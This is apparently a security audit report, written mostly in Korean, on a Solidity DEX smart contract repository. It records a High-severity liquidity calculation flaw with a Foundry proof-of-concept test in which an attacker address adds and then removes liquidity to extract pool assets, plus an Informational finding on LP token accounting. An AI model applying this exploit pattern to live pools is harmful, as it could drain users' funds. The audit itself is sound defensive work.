# cml2ZXJjYXN0bGVvbmU=

## Scope

<table>
  <tr>
    <th>Name</th>
    <td>Dex Security Audit</td>
  </tr>
  <tr>
    <th>Target / Version</th>
    <td>Git Repository (<a href="https://bit.ly/4gbW5eJ" target="_blank">DEX_solidity</a>): commit <mark>edf6e78c4b63258f408a29ef74f29b5ae6c88501</mark> (<mark>master</mark> branch)</td>
  </tr>
  <tr>
    <th>Application Type</th>
    <td>Smart contracts</td>
  </tr>
  <tr>
    <th>Lang. / Platforms</th>
    <td>Smart contracts [Solidity]</td>
  </tr>
</table>

## Findings

### #1 `001` The overall calculation of metrics for the CPMM DEX is incorrect

|ID|Summary|Severity|
|:---:|-------|:---:|
|001|*CPMM DEX* 로서의 전반적인 Calculation 오류|High|

#### Description

일반적인 *DEX*를 구현 할 때, *Stable Coin*의 경우 *CSMM*, 기타 일반 토큰의 경우 *CPMM* 방식으로 구현하게 되는데, 이를 위한 *Calculation* 과정이 잘못 구현되어 풀 내 자산 탈취가 가능함. 가령, `addLiquidity()` 함수 내에서, *Pool* 내 유동성이 존재하지 않을 때는, 두 자산의 각각의 초기 예치자산 수량 곱의 제곱근으로 LP 토큰의 유동성이 계산되고, 이후 추가적인 유동성이 공급될 때는 별도의 계산으로 처리되는 데, 이 때의 계산이 적절하지 않음. 이에, 아래와 같이 공격자가 유동성 예치 후에 즉시 예치 해제시, 자신이 예치한 유동성보다 기하급수적으로 많은 토큰을 돌려 받음.

```solidity
function testAddLiquidityAndThenRemoveLiquidity() external {
    uint256 lpReturn = dex.addLiquidity(1000 ether, 2000 ether, 0);
    emit log_named_uint("lpReturn", lpReturn); // lpReturn: 1414213562373095048801

    // Assume that Address 1 belongs to the attacker.
    vm.prank(address(1));
    uint256 lpReturnByAddressOne = dex.addLiquidity(99 ether, 200 ether, 0);
    emit log_named_uint("lpReturnByAddressOne", lpReturnByAddressOne); // lpReturnByAddressOne: 140007142674936409831

    vm.prank(address(1));
    (uint256 xReceived, uint256 yReceived) = dex.removeLiquidity(140007142674936409831, 0, 0);
    emit log_named_uint("xRecieved", xReceived); // xRecieved: 98999999999999999999
    emit log_named_uint("yReceived", yReceived); // yReceived: 198180163785259326660
}
```

#### Impact

**High**

공격자가 *Pool* 내 자산을 탈취할 수 있음.

#### Recommendation

*CPMM DEX* 구현 간에 `K`(*Constant Value*) 값의 도입 등, 전반적인 *Pool* 내 자산 비율 *Calculation* 정교화 및 고도화 요망.

### #2 `002` The *LP token* is managed solely by a `uint256` type variable

|ID|Summary|Severity|
|:---:|-------|:---:|
|002|*LP Token*의 관리가 별도의 토큰 스탠다드를 따르는 형태가 아닌, `uint256` 타입의 `totalLiquidity` 변수로 이루어짐.|Informational|

#### Description

해당 컨트랙트는 *LP Token*의 공급을 별도의 *ERC-20* 토큰의 상속 및 활용을 통한 형태로 구현한 것이 아닌, 단지 `uint256` 타입의 `totalLiquidity` 변수를 통해 관리하고 있음. 특히, `addLiquidity()` 및 `removeLiquidity()` 함수에서는, 유동성 공급이 이루어 졌을 때, 단순히 더하기 및 빼기 연산으로 *LP Token*의 전체 유통량을 증감시키는데, 만약 *Pool*의 전체 유동성이 `type(uint256).max` 값에 도달하면 어떠한 에러 핸들링 없이 유동성 공급이 불가함.

#### Impact

**Informational**

예기치 못한 유동성 공급 불가로 인한 부작용.

#### Recommendation

별도의 *ERC-20* (*Uniswap V2*의 경우) 및 *ERC-721*(*Uniswap V3*의 경우) 등의 형태로 *LP Token* 구현 요망.